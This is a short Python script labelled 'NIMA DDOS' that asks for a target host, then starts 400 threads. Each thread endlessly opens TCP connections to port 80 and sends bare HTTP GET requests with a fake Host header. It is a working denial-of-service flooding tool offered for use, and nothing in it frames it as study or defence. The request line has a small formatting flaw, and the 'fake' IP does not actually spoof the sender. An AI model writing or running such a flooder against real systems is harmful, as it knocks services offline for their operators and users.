import time
from colorama import Fore
import threading
import socket
print('𝕹𝕴𝕸𝕬 𝕯𝕯𝕺𝕾')
time.sleep(2)

remote_servse = input(Fore.GREEN + 'Enter the host name : ')
get_ip = socket.gethostbyname(remote_servse)
print('Ip addres is : ' + get_ip)

get_target = input('Enter the ip target : ')
target = get_target

port = 80

fake_ip = '185.242.22.31'


def attack():
    com = 1
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'),
                 (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'),
                 (target, port))
        s.close()
        print(com)
        com += 1


for i in range(400):
    thread = threading.Thread(target=attack)
    thread.start()
